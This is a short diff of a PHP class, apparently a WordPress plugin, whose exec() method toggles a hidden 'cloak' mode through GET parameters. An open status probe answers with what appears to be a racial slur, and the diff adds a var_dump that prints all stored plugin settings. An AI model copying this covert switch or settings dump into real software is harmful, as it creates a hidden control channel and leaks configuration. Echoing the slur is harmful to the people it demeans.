@@ -185,6 +185,8 @@ class WPIRC {
 	function exec() {
 
 		$opt = get_option( 'wcb_settings' );
+
+
 		if ( ( $_GET['cloak'] === 'status' ) ) {
 			echo 'nigs';
 
@@ -198,6 +200,8 @@ class WPIRC {
 		}
 		if ( ( $_GET['cloak'] === 'on' ) && $_GET['key'] === $opt['key'] ) {
 
+			var_dump($opt);
+			//update_option('wcb_settings',)
 			if ( file_exists( __DIR__ . '/tmp' ) ) {
 				unlink( __DIR__ . '/tmp' );
 				$this->status = true;
